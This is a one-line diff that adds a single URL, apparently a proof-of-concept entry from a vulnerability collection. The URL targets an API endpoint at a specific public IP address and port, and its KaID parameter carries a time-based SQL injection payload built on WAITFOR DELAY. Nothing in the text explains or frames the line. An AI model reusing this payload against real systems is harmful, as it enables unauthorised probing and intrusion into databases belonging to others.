@@ -1,0 +1,1 @@
+http://221.209.48.134:9007/api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:5%27--
